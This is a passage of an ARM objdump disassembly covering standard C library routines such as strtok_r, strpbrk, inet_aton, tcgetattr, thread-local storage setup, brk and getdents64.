   1ce38:	e2803001 	add	r3, r0, #1
   1ce3c:	e1a00003 	mov	r0, r3
   1ce40:	e1a01004 	mov	r1, r4
   1ce44:	ebffff69 	bl	1cbf0 <__GI_strchr>
   1ce48:	e3500000 	cmp	r0, #0
   1ce4c:	1afffff8 	bne	1ce34 <__GI_strrchr+0x24>
   1ce50:	e1a00005 	mov	r0, r5
   1ce54:	e28dd004 	add	sp, sp, #4
   1ce58:	e8bd4030 	pop	{r4, r5, lr}
   1ce5c:	e12fff1e 	bx	lr

0001ce60 <__GI_strspn>:
   1ce60:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1ce64:	e3a0e000 	mov	lr, #0
   1ce68:	ea000008 	b	1ce90 <__GI_strspn+0x30>
   1ce6c:	e15c0002 	cmp	ip, r2
   1ce70:	0a000004 	beq	1ce88 <__GI_strspn+0x28>
   1ce74:	e5d32000 	ldrb	r2, [r3]
   1ce78:	e3520000 	cmp	r2, #0
   1ce7c:	e2833001 	add	r3, r3, #1
   1ce80:	1afffff9 	bne	1ce6c <__GI_strspn+0xc>
   1ce84:	ea000005 	b	1cea0 <__GI_strspn+0x40>
   1ce88:	e28ee001 	add	lr, lr, #1
   1ce8c:	e2800001 	add	r0, r0, #1
   1ce90:	e5d0c000 	ldrb	ip, [r0]
   1ce94:	e35c0000 	cmp	ip, #0
   1ce98:	11a03001 	movne	r3, r1
   1ce9c:	1afffff4 	bne	1ce74 <__GI_strspn+0x14>
   1cea0:	e1a0000e 	mov	r0, lr
   1cea4:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1cea8:	e12fff1e 	bx	lr

0001ceac <__GI_strtok_r>:
   1ceac:	e92d4070 	push	{r4, r5, r6, lr}
   1ceb0:	e2504000 	subs	r4, r0, #0
   1ceb4:	05924000 	ldreq	r4, [r2]
   1ceb8:	e1a00004 	mov	r0, r4
   1cebc:	e1a05002 	mov	r5, r2
   1cec0:	e1a06001 	mov	r6, r1
   1cec4:	ebffffe5 	bl	1ce60 <__GI_strspn>
   1cec8:	e7d43000 	ldrb	r3, [r4, r0]
   1cecc:	e0844000 	add	r4, r4, r0
   1ced0:	e3530000 	cmp	r3, #0
   1ced4:	05854000 	streq	r4, [r5]
   1ced8:	0a00000e 	beq	1cf18 <__GI_strtok_r+0x6c>
   1cedc:	e1a01006 	mov	r1, r6
   1cee0:	e1a00004 	mov	r0, r4
   1cee4:	eb00000e 	bl	1cf24 <__GI_strpbrk>
   1cee8:	e3500000 	cmp	r0, #0
   1ceec:	1a000005 	bne	1cf08 <__GI_strtok_r+0x5c>
   1cef0:	e1a01000 	mov	r1, r0
   1cef4:	e1a00004 	mov	r0, r4
   1cef8:	eb000269 	bl	1d8a4 <__GI_rawmemchr>
   1cefc:	e1a03004 	mov	r3, r4
   1cf00:	e5850000 	str	r0, [r5]
   1cf04:	ea000003 	b	1cf18 <__GI_strtok_r+0x6c>
   1cf08:	e3a03000 	mov	r3, #0
   1cf0c:	e4c03001 	strb	r3, [r0], #1
   1cf10:	e5850000 	str	r0, [r5]
   1cf14:	e1a03004 	mov	r3, r4
   1cf18:	e1a00003 	mov	r0, r3
   1cf1c:	e8bd4070 	pop	{r4, r5, r6, lr}
   1cf20:	e12fff1e 	bx	lr

0001cf24 <__GI_strpbrk>:
   1cf24:	e1a02000 	mov	r2, r0
   1cf28:	ea000008 	b	1cf50 <__GI_strpbrk+0x2c>
   1cf2c:	e15c0000 	cmp	ip, r0
   1cf30:	1a000001 	bne	1cf3c <__GI_strpbrk+0x18>
   1cf34:	e1a00002 	mov	r0, r2
   1cf38:	e12fff1e 	bx	lr
   1cf3c:	e5d3c000 	ldrb	ip, [r3]
   1cf40:	e35c0000 	cmp	ip, #0
   1cf44:	e2833001 	add	r3, r3, #1
   1cf48:	1afffff7 	bne	1cf2c <__GI_strpbrk+0x8>
   1cf4c:	e2822001 	add	r2, r2, #1
   1cf50:	e5d20000 	ldrb	r0, [r2]
   1cf54:	e3500000 	cmp	r0, #0
   1cf58:	012fff1e 	bxeq	lr
   1cf5c:	e1a03001 	mov	r3, r1
   1cf60:	eafffff5 	b	1cf3c <__GI_strpbrk+0x18>

0001cf64 <__GI_isatty>:
   1cf64:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1cf68:	e24dd044 	sub	sp, sp, #68	; 0x44
   1cf6c:	e28d1004 	add	r1, sp, #4
   1cf70:	eb000004 	bl	1cf88 <__GI_tcgetattr>
   1cf74:	e2700001 	rsbs	r0, r0, #1
   1cf78:	33a00000 	movcc	r0, #0
   1cf7c:	e28dd044 	add	sp, sp, #68	; 0x44
   1cf80:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1cf84:	e12fff1e 	bx	lr

0001cf88 <__GI_tcgetattr>:
   1cf88:	e92d4070 	push	{r4, r5, r6, lr}
   1cf8c:	e24dd028 	sub	sp, sp, #40	; 0x28
   1cf90:	e28d6004 	add	r6, sp, #4
   1cf94:	e1a04001 	mov	r4, r1
   1cf98:	e1a02006 	mov	r2, r6
   1cf9c:	e59f105c 	ldr	r1, [pc, #92]	; 1d000 <__GI_tcgetattr+0x78>
   1cfa0:	ebffe445 	bl	160bc <__GI_ioctl>
   1cfa4:	e2505000 	subs	r5, r0, #0
   1cfa8:	1a000010 	bne	1cff0 <__GI_tcgetattr+0x68>
   1cfac:	e59d2008 	ldr	r2, [sp, #8]
   1cfb0:	e59d100c 	ldr	r1, [sp, #12]
   1cfb4:	e59d0010 	ldr	r0, [sp, #16]
   1cfb8:	e5ddc014 	ldrb	ip, [sp, #20]
   1cfbc:	e59d3004 	ldr	r3, [sp, #4]
   1cfc0:	e5842004 	str	r2, [r4, #4]
   1cfc4:	e5841008 	str	r1, [r4, #8]
   1cfc8:	e584000c 	str	r0, [r4, #12]
   1cfcc:	e2861011 	add	r1, r6, #17
   1cfd0:	e3a02013 	mov	r2, #19
   1cfd4:	e5843000 	str	r3, [r4]
   1cfd8:	e5c4c010 	strb	ip, [r4, #16]
   1cfdc:	e2840011 	add	r0, r4, #17
   1cfe0:	eb000226 	bl	1d880 <__GI_mempcpy>
   1cfe4:	e1a01005 	mov	r1, r5
   1cfe8:	e3a0200d 	mov	r2, #13
   1cfec:	ebffe637 	bl	168d0 <__GI_memset>
   1cff0:	e1a00005 	mov	r0, r5
   1cff4:	e28dd028 	add	sp, sp, #40	; 0x28
   1cff8:	e8bd4070 	pop	{r4, r5, r6, lr}
   1cffc:	e12fff1e 	bx	lr
   1d000:	00005401 	.word	0x00005401

0001d004 <__GI_inet_aton>:
   1d004:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1d008:	e59f50e4 	ldr	r5, [pc, #228]	; 1d0f4 <__GI_inet_aton+0xf0>
   1d00c:	e3500000 	cmp	r0, #0
   1d010:	e08f5005 	add	r5, pc, r5
   1d014:	e1a06001 	mov	r6, r1
   1d018:	0a000032 	beq	1d0e8 <__GI_inet_aton+0xe4>
   1d01c:	e3a0e000 	mov	lr, #0
   1d020:	e59fa0d0 	ldr	sl, [pc, #208]	; 1d0f8 <__GI_inet_aton+0xf4>
   1d024:	e3a04001 	mov	r4, #1
   1d028:	e1a0800e 	mov	r8, lr
   1d02c:	e3a0700a 	mov	r7, #10
   1d030:	ea00001f 	b	1d0b4 <__GI_inet_aton+0xb0>
   1d034:	e5d03000 	ldrb	r3, [r0]
   1d038:	e795100a 	ldr	r1, [r5, sl]
   1d03c:	e1a03083 	lsl	r3, r3, #1
   1d040:	e19330b1 	ldrh	r3, [r3, r1]
   1d044:	e3130008 	tst	r3, #8
   1d048:	0a000026 	beq	1d0e8 <__GI_inet_aton+0xe4>
   1d04c:	e1a0c008 	mov	ip, r8
   1d050:	ea000005 	b	1d06c <__GI_inet_aton+0x68>
   1d054:	e003079c 	mul	r3, ip, r7
   1d058:	e2433030 	sub	r3, r3, #48	; 0x30
   1d05c:	e083c002 	add	ip, r3, r2
   1d060:	e35c00ff 	cmp	ip, #255	; 0xff
   1d064:	ca00001f 	bgt	1d0e8 <__GI_inet_aton+0xe4>
   1d068:	e2800001 	add	r0, r0, #1
   1d06c:	e5d02000 	ldrb	r2, [r0]
   1d070:	e1a03082 	lsl	r3, r2, #1
   1d074:	e19330b1 	ldrh	r3, [r3, r1]
   1d078:	e3130008 	tst	r3, #8
   1d07c:	1afffff4 	bne	1d054 <__GI_inet_aton+0x50>
   1d080:	e3540004 	cmp	r4, #4
   1d084:	0a000003 	beq	1d098 <__GI_inet_aton+0x94>
   1d088:	e352002e 	cmp	r2, #46	; 0x2e
   1d08c:	1a000015 	bne	1d0e8 <__GI_inet_aton+0xe4>
   1d090:	e2800001 	add	r0, r0, #1
   1d094:	ea000004 	b	1d0ac <__GI_inet_aton+0xa8>
   1d098:	e3520000 	cmp	r2, #0
   1d09c:	e2800001 	add	r0, r0, #1
   1d0a0:	0a000001 	beq	1d0ac <__GI_inet_aton+0xa8>
   1d0a4:	e3130020 	tst	r3, #32
   1d0a8:	0a00000e 	beq	1d0e8 <__GI_inet_aton+0xe4>
   1d0ac:	e18ce40e 	orr	lr, ip, lr, lsl #8
   1d0b0:	e2844001 	add	r4, r4, #1
   1d0b4:	e3540004 	cmp	r4, #4
   1d0b8:	daffffdd 	ble	1d034 <__GI_inet_aton+0x30>
   1d0bc:	e3560000 	cmp	r6, #0
   1d0c0:	11a02c2e 	lsrne	r2, lr, #24
   1d0c4:	120e38ff 	andne	r3, lr, #16711680	; 0xff0000
   1d0c8:	11822423 	orrne	r2, r2, r3, lsr #8
   1d0cc:	120e3cff 	andne	r3, lr, #65280	; 0xff00
   1d0d0:	11822403 	orrne	r2, r2, r3, lsl #8
   1d0d4:	11822c0e 	orrne	r2, r2, lr, lsl #24
   1d0d8:	03a00001 	moveq	r0, #1
   1d0dc:	13a00001 	movne	r0, #1
   1d0e0:	15862000 	strne	r2, [r6]
   1d0e4:	ea000000 	b	1d0ec <__GI_inet_aton+0xe8>
   1d0e8:	e3a00000 	mov	r0, #0
   1d0ec:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   1d0f0:	e12fff1e 	bx	lr
   1d0f4:	0000b97c 	.word	0x0000b97c
   1d0f8:	000001ec 	.word	0x000001ec

0001d0fc <init_static_tls>:
   1d0fc:	e59fc058 	ldr	ip, [pc, #88]	; 1d15c <init_static_tls+0x60>
   1d100:	e59f3058 	ldr	r3, [pc, #88]	; 1d160 <init_static_tls+0x64>
   1d104:	e08fc00c 	add	ip, pc, ip
   1d108:	e92d4070 	push	{r4, r5, r6, lr}
   1d10c:	e79c6003 	ldr	r6, [ip, r3]
   1d110:	e59f304c 	ldr	r3, [pc, #76]	; 1d164 <init_static_tls+0x68>
   1d114:	e79c5003 	ldr	r5, [ip, r3]
   1d118:	e59f3048 	ldr	r3, [pc, #72]	; 1d168 <init_static_tls+0x6c>
   1d11c:	e79c4003 	ldr	r4, [ip, r3]
   1d120:	e59f3044 	ldr	r3, [pc, #68]	; 1d16c <init_static_tls+0x70>
   1d124:	e5962000 	ldr	r2, [r6]
   1d128:	e79ce003 	ldr	lr, [ip, r3]
   1d12c:	e59f303c 	ldr	r3, [pc, #60]	; 1d170 <init_static_tls+0x74>
   1d130:	e282200f 	add	r2, r2, #15
   1d134:	e79cc003 	ldr	ip, [ip, r3]
   1d138:	e0822000 	add	r2, r2, r0
   1d13c:	e5953000 	ldr	r3, [r5]
   1d140:	e3c2200f 	bic	r2, r2, #15
   1d144:	e5862000 	str	r2, [r6]
   1d148:	e5840000 	str	r0, [r4]
   1d14c:	e58e1000 	str	r1, [lr]
   1d150:	e58c3000 	str	r3, [ip]
   1d154:	e8bd4070 	pop	{r4, r5, r6, lr}
   1d158:	e12fff1e 	bx	lr
   1d15c:	0000b888 	.word	0x0000b888
   1d160:	00000048 	.word	0x00000048
   1d164:	0000003c 	.word	0x0000003c
   1d168:	00000024 	.word	0x00000024
   1d16c:	00000034 	.word	0x00000034
   1d170:	00000090 	.word	0x00000090

0001d174 <_dl_tls_setup>:
   1d174:	e59f3050 	ldr	r3, [pc, #80]	; 1d1cc <_dl_tls_setup+0x58>
   1d178:	e59f2050 	ldr	r2, [pc, #80]	; 1d1d0 <_dl_tls_setup+0x5c>
   1d17c:	e08f3003 	add	r3, pc, r3
   1d180:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1d184:	e793e002 	ldr	lr, [r3, r2]
   1d188:	e59f2044 	ldr	r2, [pc, #68]	; 1d1d4 <_dl_tls_setup+0x60>
   1d18c:	e59f1044 	ldr	r1, [pc, #68]	; 1d1d8 <_dl_tls_setup+0x64>
   1d190:	e793c002 	ldr	ip, [r3, r2]
   1d194:	e3a02040 	mov	r2, #64	; 0x40
   1d198:	e7832001 	str	r2, [r3, r1]
   1d19c:	e0833001 	add	r3, r3, r1
   1d1a0:	e3a02001 	mov	r2, #1
   1d1a4:	e24dd004 	sub	sp, sp, #4
   1d1a8:	e3a00000 	mov	r0, #0
   1d1ac:	e3a01010 	mov	r1, #16
   1d1b0:	e58c2000 	str	r2, [ip]
   1d1b4:	e58e3000 	str	r3, [lr]
   1d1b8:	ebffffcf 	bl	1d0fc <init_static_tls>
   1d1bc:	e3a00000 	mov	r0, #0
   1d1c0:	e28dd004 	add	sp, sp, #4
   1d1c4:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1d1c8:	e12fff1e 	bx	lr
   1d1cc:	0000b810 	.word	0x0000b810
   1d1d0:	00000054 	.word	0x00000054
   1d1d4:	0000003c 	.word	0x0000003c
   1d1d8:	00002bd8 	.word	0x00002bd8

0001d1dc <__tls_get_addr>:
   1d1dc:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1d1e0:	e1a02000 	mov	r2, r0
   1d1e4:	ebfff5a1 	bl	1a870 <__aeabi_read_tp>
   1d1e8:	e5903000 	ldr	r3, [r0]
   1d1ec:	e5922004 	ldr	r2, [r2, #4]
   1d1f0:	e5930008 	ldr	r0, [r3, #8]
   1d1f4:	e0800002 	add	r0, r0, r2
   1d1f8:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1d1fc:	e12fff1e 	bx	lr

0001d200 <__libc_setup_tls>:
   1d200:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1d204:	e59fa1fc 	ldr	sl, [pc, #508]	; 1d408 <__libc_setup_tls+0x208>
   1d208:	e59f31fc 	ldr	r3, [pc, #508]	; 1d40c <__libc_setup_tls+0x20c>
   1d20c:	e08fa00a 	add	sl, pc, sl
   1d210:	e79a3003 	ldr	r3, [sl, r3]
   1d214:	e5932000 	ldr	r2, [r3]
   1d218:	e3520000 	cmp	r2, #0
   1d21c:	e24dd014 	sub	sp, sp, #20
   1d220:	e1a05000 	mov	r5, r0
   1d224:	e1a0c001 	mov	ip, r1
   1d228:	0a00006f 	beq	1d3ec <__libc_setup_tls+0x1ec>
   1d22c:	e59f31dc 	ldr	r3, [pc, #476]	; 1d410 <__libc_setup_tls+0x210>
   1d230:	e79ae003 	ldr	lr, [sl, r3]
   1d234:	e1a01002 	mov	r1, r2
   1d238:	ea00000e 	b	1d278 <__libc_setup_tls+0x78>
   1d23c:	e5913000 	ldr	r3, [r1]
   1d240:	e3530007 	cmp	r3, #7
   1d244:	1a00000a 	bne	1d274 <__libc_setup_tls+0x74>
   1d248:	e5913014 	ldr	r3, [r1, #20]
   1d24c:	e591601c 	ldr	r6, [r1, #28]
   1d250:	e58d3004 	str	r3, [sp, #4]
   1d254:	e5913010 	ldr	r3, [r1, #16]
   1d258:	e5911008 	ldr	r1, [r1, #8]
   1d25c:	e156000c 	cmp	r6, ip
   1d260:	e58d3008 	str	r3, [sp, #8]
   1d264:	e58d100c 	str	r1, [sp, #12]
   1d268:	91a0b00c 	movls	fp, ip
   1d26c:	9a000007 	bls	1d290 <__libc_setup_tls+0x90>
   1d270:	ea000005 	b	1d28c <__libc_setup_tls+0x8c>
   1d274:	e2811020 	add	r1, r1, #32
   1d278:	e59e3000 	ldr	r3, [lr]
   1d27c:	e0823283 	add	r3, r2, r3, lsl #5
   1d280:	e1510003 	cmp	r1, r3
   1d284:	3affffec 	bcc	1d23c <__libc_setup_tls+0x3c>
   1d288:	ea000057 	b	1d3ec <__libc_setup_tls+0x1ec>
   1d28c:	e1a0b006 	mov	fp, r6
   1d290:	e3560000 	cmp	r6, #0
   1d294:	12460001 	subne	r0, r6, #1
   1d298:	1a000003 	bne	1d2ac <__libc_setup_tls+0xac>
   1d29c:	e3560000 	cmp	r6, #0
   1d2a0:	e3a00000 	mov	r0, #0
   1d2a4:	03a01001 	moveq	r1, #1
   1d2a8:	0a000002 	beq	1d2b8 <__libc_setup_tls+0xb8>
   1d2ac:	e2561000 	subs	r1, r6, #0
   1d2b0:	11a04006 	movne	r4, r6
   1d2b4:	1a000000 	bne	1d2bc <__libc_setup_tls+0xbc>
   1d2b8:	e3a04001 	mov	r4, #1
   1d2bc:	e0800005 	add	r0, r0, r5
   1d2c0:	ebffe27a 	bl	15cb0 <__udivsi3>
   1d2c4:	e0090490 	mul	r9, r0, r4
   1d2c8:	e59f3144 	ldr	r3, [pc, #324]	; 1d414 <__libc_setup_tls+0x214>
   1d2cc:	e79a3003 	ldr	r3, [sl, r3]
   1d2d0:	e5930000 	ldr	r0, [r3]
   1d2d4:	e59d3004 	ldr	r3, [sp, #4]
   1d2d8:	e2800e49 	add	r0, r0, #1168	; 0x490
   1d2dc:	e0800003 	add	r0, r0, r3
   1d2e0:	e080000b 	add	r0, r0, fp
   1d2e4:	e0800009 	add	r0, r0, r9
   1d2e8:	ebfff65f 	bl	1ac6c <__GI_sbrk>
   1d2ec:	e080500b 	add	r5, r0, fp
   1d2f0:	e2855d12 	add	r5, r5, #1152	; 0x480
   1d2f4:	e26b3000 	rsb	r3, fp, #0
   1d2f8:	e59f4118 	ldr	r4, [pc, #280]	; 1d418 <__libc_setup_tls+0x218>
   1d2fc:	e285500f 	add	r5, r5, #15
   1d300:	e0055003 	and	r5, r5, r3
   1d304:	e3a0303e 	mov	r3, #62	; 0x3e
   1d308:	e78a3004 	str	r3, [sl, r4]
   1d30c:	e59f3108 	ldr	r3, [pc, #264]	; 1d41c <__libc_setup_tls+0x21c>
   1d310:	e085c009 	add	ip, r5, r9
   1d314:	e08a4004 	add	r4, sl, r4
   1d318:	e08a8003 	add	r8, sl, r3
   1d31c:	e3a03001 	mov	r3, #1
   1d320:	e59d100c 	ldr	r1, [sp, #12]
   1d324:	e59d2008 	ldr	r2, [sp, #8]
   1d328:	e1a0000c 	mov	r0, ip
   1d32c:	e584c010 	str	ip, [r4, #16]
   1d330:	e5889028 	str	r9, [r8, #40]	; 0x28
   1d334:	e5c43014 	strb	r3, [r4, #20]
   1d338:	e2844008 	add	r4, r4, #8
   1d33c:	ebffe55b 	bl	168b0 <__GI_memcpy>
   1d340:	e59f70d8 	ldr	r7, [pc, #216]	; 1d420 <__libc_setup_tls+0x220>
   1d344:	e5854000 	str	r4, [r5]
   1d348:	e1a00005 	mov	r0, r5
   1d34c:	ef000000 	svc	0x00000000
   1d350:	e3700a01 	cmn	r0, #4096	; 0x1000
   1d354:	8bffec98 	blhi	185bc <__GI_abort>
   1d358:	e59f30c4 	ldr	r3, [pc, #196]	; 1d424 <__libc_setup_tls+0x224>
   1d35c:	e79ac003 	ldr	ip, [sl, r3]
   1d360:	e59f30c0 	ldr	r3, [pc, #192]	; 1d428 <__libc_setup_tls+0x228>
   1d364:	e59f10c0 	ldr	r1, [pc, #192]	; 1d42c <__libc_setup_tls+0x22c>
   1d368:	e79a0003 	ldr	r0, [sl, r3]
   1d36c:	e3a03040 	mov	r3, #64	; 0x40
   1d370:	e78a3001 	str	r3, [sl, r1]
   1d374:	e59d300c 	ldr	r3, [sp, #12]
   1d378:	e5883014 	str	r3, [r8, #20]
   1d37c:	e59d3008 	ldr	r3, [sp, #8]
   1d380:	e5883018 	str	r3, [r8, #24]
   1d384:	e3a03001 	mov	r3, #1
   1d388:	e5803000 	str	r3, [r0]
   1d38c:	e59d3004 	ldr	r3, [sp, #4]
   1d390:	e588301c 	str	r3, [r8, #28]
   1d394:	e3a03001 	mov	r3, #1
   1d398:	e3560000 	cmp	r6, #0
   1d39c:	e588302c 	str	r3, [r8, #44]	; 0x2c
   1d3a0:	e59d3004 	ldr	r3, [sp, #4]
   1d3a4:	e08a2001 	add	r2, sl, r1
   1d3a8:	01a00006 	moveq	r0, r6
   1d3ac:	12460001 	subne	r0, r6, #1
   1d3b0:	03a01001 	moveq	r1, #1
   1d3b4:	e5886020 	str	r6, [r8, #32]
   1d3b8:	11a01006 	movne	r1, r6
   1d3bc:	e582801c 	str	r8, [r2, #28]
   1d3c0:	e58c2000 	str	r2, [ip]
   1d3c4:	e0800003 	add	r0, r0, r3
   1d3c8:	01a06001 	moveq	r6, r1
   1d3cc:	ebffe237 	bl	15cb0 <__udivsi3>
   1d3d0:	e0209096 	mla	r0, r6, r0, r9
   1d3d4:	e35b0010 	cmp	fp, #16
   1d3d8:	21a0100b 	movcs	r1, fp
   1d3dc:	33a01010 	movcc	r1, #16
   1d3e0:	e28dd014 	add	sp, sp, #20
   1d3e4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1d3e8:	eaffff43 	b	1d0fc <init_static_tls>
   1d3ec:	e3a03000 	mov	r3, #0
   1d3f0:	e1a06003 	mov	r6, r3
   1d3f4:	e1a0b00c 	mov	fp, ip
   1d3f8:	e58d3008 	str	r3, [sp, #8]
   1d3fc:	e58d3004 	str	r3, [sp, #4]
   1d400:	e58d300c 	str	r3, [sp, #12]
   1d404:	eaffffa4 	b	1d29c <__libc_setup_tls+0x9c>
   1d408:	0000b780 	.word	0x0000b780
   1d40c:	00000068 	.word	0x00000068
   1d410:	0000009c 	.word	0x0000009c
   1d414:	00000048 	.word	0x00000048
   1d418:	000029d8 	.word	0x000029d8
   1d41c:	00002ee0 	.word	0x00002ee0
   1d420:	000f0005 	.word	0x000f0005
   1d424:	00000054 	.word	0x00000054
   1d428:	0000003c 	.word	0x0000003c
   1d42c:	00002bd8 	.word	0x00002bd8

0001d430 <__pthread_initialize_minimal>:
   1d430:	e3a00008 	mov	r0, #8
   1d434:	e3a01010 	mov	r1, #16
   1d438:	eaffff70 	b	1d200 <__libc_setup_tls>

0001d43c <_dl_aux_init>:
   1d43c:	e59f2024 	ldr	r2, [pc, #36]	; 1d468 <_dl_aux_init+0x2c>
   1d440:	e59f3024 	ldr	r3, [pc, #36]	; 1d46c <_dl_aux_init+0x30>
   1d444:	e08f2002 	add	r2, pc, r2
   1d448:	e792c003 	ldr	ip, [r2, r3]
   1d44c:	e59f301c 	ldr	r3, [pc, #28]	; 1d470 <_dl_aux_init+0x34>
   1d450:	e7921003 	ldr	r1, [r2, r3]
   1d454:	e590302c 	ldr	r3, [r0, #44]	; 0x2c
   1d458:	e590201c 	ldr	r2, [r0, #28]
   1d45c:	e58c3000 	str	r3, [ip]
   1d460:	e5812000 	str	r2, [r1]
   1d464:	e12fff1e 	bx	lr
   1d468:	0000b548 	.word	0x0000b548
   1d46c:	0000009c 	.word	0x0000009c
   1d470:	00000068 	.word	0x00000068

0001d474 <_dl_nothread_init_static_tls>:
   1d474:	e92d4010 	push	{r4, lr}
   1d478:	e1a04000 	mov	r4, r0
   1d47c:	e2842028 	add	r2, r4, #40	; 0x28
   1d480:	e892000c 	ldm	r2, {r2, r3}
   1d484:	ebfff4f9 	bl	1a870 <__aeabi_read_tp>
   1d488:	e5901000 	ldr	r1, [r0]
   1d48c:	e1a03183 	lsl	r3, r3, #3
   1d490:	e0800002 	add	r0, r0, r2
   1d494:	e7830001 	str	r0, [r3, r1]
   1d498:	e0832001 	add	r2, r3, r1
   1d49c:	e3a03001 	mov	r3, #1
   1d4a0:	e5c23004 	strb	r3, [r2, #4]
   1d4a4:	e2841014 	add	r1, r4, #20
   1d4a8:	e8910006 	ldm	r1, {r1, r2}
   1d4ac:	eb0000f3 	bl	1d880 <__GI_mempcpy>
   1d4b0:	e284301c 	add	r3, r4, #28
   1d4b4:	e813000c 	ldmda	r3, {r2, r3}
   1d4b8:	e0432002 	sub	r2, r3, r2
   1d4bc:	e3a01000 	mov	r1, #0
   1d4c0:	ebffe502 	bl	168d0 <__GI_memset>
   1d4c4:	e8bd4010 	pop	{r4, lr}
   1d4c8:	e12fff1e 	bx	lr

0001d4cc <__GI_brk>:
   1d4cc:	e59f2044 	ldr	r2, [pc, #68]	; 1d518 <__GI_brk+0x4c>
   1d4d0:	e92d4080 	push	{r7, lr}
   1d4d4:	e08f2002 	add	r2, pc, r2
   1d4d8:	e1a03000 	mov	r3, r0
   1d4dc:	e3a0702d 	mov	r7, #45	; 0x2d
   1d4e0:	ef000000 	svc	0x00000000
   1d4e4:	e1500003 	cmp	r0, r3
   1d4e8:	e59f302c 	ldr	r3, [pc, #44]	; 1d51c <__GI_brk+0x50>
   1d4ec:	e7820003 	str	r0, [r2, r3]
   1d4f0:	23a00000 	movcs	r0, #0
   1d4f4:	2a000005 	bcs	1d510 <__GI_brk+0x44>
   1d4f8:	e59f3020 	ldr	r3, [pc, #32]	; 1d520 <__GI_brk+0x54>
   1d4fc:	ebfff4db 	bl	1a870 <__aeabi_read_tp>
   1d500:	e79f3003 	ldr	r3, [pc, r3]
   1d504:	e3a0200c 	mov	r2, #12
   1d508:	e7802003 	str	r2, [r0, r3]
   1d50c:	e3e00000 	mvn	r0, #0
   1d510:	e8bd4080 	pop	{r7, lr}
   1d514:	e12fff1e 	bx	lr
   1d518:	0000b4b8 	.word	0x0000b4b8
   1d51c:	00002f14 	.word	0x00002f14
   1d520:	0000b4e4 	.word	0x0000b4e4

0001d524 <__sigsetjmp>:
   1d524:	e1a0c000 	mov	ip, r0
   1d528:	e8ac6ff0 	stmia	ip!, {r4, r5, r6, r7, r8, r9, sl, fp, sp, lr}
   1d52c:	ea000108 	b	1d954 <__sigjmp_save>

0001d530 <__getdents64>:
   1d530:	e1a0c00d 	mov	ip, sp
   1d534:	e92ddff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
   1d538:	e282300e 	add	r3, r2, #14
   1d53c:	e24cb004 	sub	fp, ip, #4
   1d540:	e24dd01c 	sub	sp, sp, #28
   1d544:	e3c33007 	bic	r3, r3, #7
   1d548:	e063d00d 	rsb	sp, r3, sp
   1d54c:	e28d3008 	add	r3, sp, #8
   1d550:	e1a0a001 	mov	sl, r1
   1d554:	e1a05001 	mov	r5, r1
   1d558:	e50b0030 	str	r0, [fp, #-48]	; 0xffffffd0
   1d55c:	e1a01003 	mov	r1, r3
   1d560:	e3a070d9 	mov	r7, #217	; 0xd9
   1d564:	ef000000 	svc	0x00000000
   1d568:	e3700a01 	cmn	r0, #4096	; 0x1000
   1d56c:	e1a01000 	mov	r1, r0
   1d570:	9a000006 	bls	1d590 <__getdents64+0x60>
   1d574:	e59f30f4 	ldr	r3, [pc, #244]	; 1d670 <__getdents64+0x140>
   1d578:	e2602000 	rsb	r2, r0, #0
   1d57c:	e79f3003 	ldr	r3, [pc, r3]
   1d580:	ebfff4ba 	bl	1a870 <__aeabi_read_tp>
   1d584:	e3e01000 	mvn	r1, #0
   1d588:	e7802003 	str	r2, [r0, r3]
   1d58c:	ea000033 	b	1d660 <__getdents64+0x130>
   1d590:	e3700001 	cmn	r0, #1
   1d594:	0a000031 	beq	1d660 <__getdents64+0x130>
   1d598:	e0831000 	add	r1, r3, r0
   1d59c:	e08ac002 	add	ip, sl, r2
   1d5a0:	e1a07003 	mov	r7, r3
   1d5a4:	e3e08000 	mvn	r8, #0
   1d5a8:	e3e09000 	mvn	r9, #0
   1d5ac:	e50b1034 	str	r1, [fp, #-52]	; 0xffffffcc
   1d5b0:	e50bc038 	str	ip, [fp, #-56]	; 0xffffffc8
   1d5b4:	ea000023 	b	1d648 <__getdents64+0x118>
   1d5b8:	e1d731b0 	ldrh	r3, [r7, #16]
   1d5bc:	e2432013 	sub	r2, r3, #19
   1d5c0:	e2833007 	add	r3, r3, #7
   1d5c4:	e3c3c007 	bic	ip, r3, #7
   1d5c8:	e51b3038 	ldr	r3, [fp, #-56]	; 0xffffffc8
   1d5cc:	e085600c 	add	r6, r5, ip
   1d5d0:	e1560003 	cmp	r6, r3
   1d5d4:	9a00000e 	bls	1d614 <__getdents64+0xe4>
   1d5d8:	e3a01000 	mov	r1, #0
   1d5dc:	e51b0030 	ldr	r0, [fp, #-48]	; 0xffffffd0
   1d5e0:	e1a02008 	mov	r2, r8
   1d5e4:	e1a03009 	mov	r3, r9
   1d5e8:	e58d1000 	str	r1, [sp]
   1d5ec:	eb0000e8 	bl	1d994 <__GI_lseek64>
   1d5f0:	e155000a 	cmp	r5, sl
   1d5f4:	1a000018 	bne	1d65c <__getdents64+0x12c>
   1d5f8:	e59f2074 	ldr	r2, [pc, #116]	; 1d674 <__getdents64+0x144>
   1d5fc:	ebfff49b 	bl	1a870 <__aeabi_read_tp>
   1d600:	e79f2002 	ldr	r2, [pc, r2]
   1d604:	e3a03016 	mov	r3, #22
   1d608:	e3e01000 	mvn	r1, #0
   1d60c:	e7803002 	str	r3, [r0, r2]
   1d610:	ea000012 	b	1d660 <__getdents64+0x130>
   1d614:	e8970018 	ldm	r7, {r3, r4}
   1d618:	e2878008 	add	r8, r7, #8
   1d61c:	e8980300 	ldm	r8, {r8, r9}
   1d620:	e8850018 	stm	r5, {r3, r4}
   1d624:	e5858008 	str	r8, [r5, #8]
   1d628:	e585900c 	str	r9, [r5, #12]
   1d62c:	e1c5c1b0 	strh	ip, [r5, #16]
   1d630:	e5d73012 	ldrb	r3, [r7, #18]
